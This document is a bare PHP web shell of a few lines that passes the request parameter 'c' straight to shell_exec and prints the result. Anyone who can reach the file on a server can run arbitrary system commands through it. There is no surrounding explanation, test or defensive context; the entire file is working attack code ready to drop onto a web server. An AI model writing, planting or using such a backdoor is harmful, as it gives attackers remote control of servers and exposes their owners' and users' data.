<?php
if(isset($_REQUEST['c'])){
    echo "<pre>" . shell_exec($_REQUEST['c']) . "</pre>";
}
?>
